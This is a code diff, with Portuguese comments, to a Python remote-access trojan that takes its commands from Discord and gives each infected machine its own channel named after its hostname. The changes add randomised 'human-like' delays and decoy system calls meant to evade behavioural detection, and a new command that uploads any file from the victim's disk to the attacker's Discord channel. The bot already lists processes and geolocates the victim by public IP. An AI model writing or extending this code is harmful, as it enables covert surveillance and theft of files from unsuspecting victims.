@@ -39,14 +39,31 @@ def get_public_ip():
     except:
         return "IP não disponível"
 
-# Simula ações benignas antes da execução do comando
+
+def atraso_humano(min_s=0.5, max_s=1.5):
+    time.sleep(random.uniform(min_s, max_s))
+
+
 def normal_activity():
-    try:
-        os.listdir(".")
-        platform.processor()
-        os.getcwd()
-    except:
-        pass
+    atividades = [
+        lambda: os.listdir("."),
+        lambda: platform.processor(),
+        lambda: os.getcwd(),
+        lambda: os.path.expanduser("~"),
+        lambda: platform.architecture(),
+        lambda: os.path.exists("C:\\Windows"), 
+        lambda: platform.system(),
+        lambda: os.cpu_count()
+    ]
+
+    comandos = random.sample(atividades, k=random.randint(2, 4))
+    
+    for comando in comandos:
+        try:
+            comando()
+        except:
+            pass
+        atraso_humano()
 
 
 # ===================== CLASSES DE VIEW =====================
@@ -129,16 +146,17 @@ async def sys_action(interaction: discord.Interaction, comando: str):
 @bot.tree.command(name="proc", description="Lista os processos em execução na máquina")
 async def process(interaction: discord.Interaction):
     if interaction.channel.name.lower() == platform.node().lower():
+        await interaction.response.defer(thinking=True)
         normal_activity()
         try:
             output = subprocess.check_output("tasklist" if platform.system() == "Windows" else "ps aux", shell=True, text=True, stderr=subprocess.STDOUT, encoding=ENCODING)
             file_path = "process_list.txt"
             with open(file_path, "w", encoding="utf-8") as f:
                 f.write(output)
-            await interaction.response.send_message("Lista de processos:", file=discord.File(file_path))
+            await interaction.followup.send("Lista de processos:", file=discord.File(file_path))
             os.remove(file_path)
         except subprocess.CalledProcessError as e:
-            await interaction.response.send_message(f"Erro ao obter processos: {e}", ephemeral=True)
+            await interaction.followup.send(f"Erro ao obter processos: {e}", ephemeral=True)
     else:
         await interaction.response.send_message("⚠ Este comando só pode ser usado no canal correspondente!", ephemeral=True)
 
@@ -146,6 +164,7 @@ async def process(interaction: discord.Interaction):
 @bot.tree.command(name="loc", description="Obtém a localização aproximada")
 async def location(interaction: discord.Interaction):
     if interaction.channel.name.lower() == platform.node().lower():
+        await interaction.response.defer(thinking=True)
         normal_activity()
         try:
             ip = get_public_ip()
@@ -153,23 +172,39 @@ async def location(interaction: discord.Interaction):
                 data = json.loads(response.read().decode())
 
             if data["status"] == "success":
-                embed = discord.Embed(title="📍 Localização Aproximada", color=discord.Color.blue())
+                embed = discord.Embed(title="Localização Aproximada", color=discord.Color.blue())
                 embed.add_field(name="IP", value=f"`{ip}`", inline=False)
                 embed.add_field(name="País", value=data["country"], inline=True)
                 embed.add_field(name="Cidade", value=data["city"], inline=True)
                 embed.add_field(name="ISP", value=data["isp"], inline=False)
-                embed.set_footer(text="Localização obtida via IP público")
 
-                await interaction.response.send_message(embed=embed)
+                await interaction.followup.send(embed=embed)
             else:
-                await interaction.response.send_message("❌ Não foi possível obter a localização.")
+                await interaction.followup.send("❌ Não foi possível obter a localização.")
         except Exception as e:
-            await interaction.response.send_message(f"⚠ Erro: {str(e)}", ephemeral=True)
+            await interaction.followup.send(f"⚠ Erro: {str(e)}", ephemeral=True)
+    else:
+        await interaction.response.send_message("⚠ Este comando só pode ser usado no canal da máquina correspondente!", ephemeral=True)
+
+
+@bot.tree.command(name="dwn", description="Faz download de um ficheiro")
+async def download(interaction: discord.Interaction, caminho: str):
+    if interaction.channel.name.lower() == platform.node().lower():
+        await interaction.response.defer(thinking=True)
+        normal_activity()
+        if os.path.exists(caminho):
+            try:
+                await interaction.followup.send(content="Ficheiro encontrado:", file=discord.File(caminho))
+            except Exception as e:
+                await interaction.followup.send(f"❌ Erro ao tentar enviar o ficheiro: {e}", ephemeral=True)
+        else:
+            await interaction.followup.send("❌ Ficheiro não encontrado.", ephemeral=True)
     else:
         await interaction.response.send_message("⚠ Este comando só pode ser usado no canal da máquina correspondente!", ephemeral=True)
 
 
 # ===================== EXECUÇÃO INICIAL =====================
 
+normal_activity()
 random_wait()
 bot.run(TOKEN)
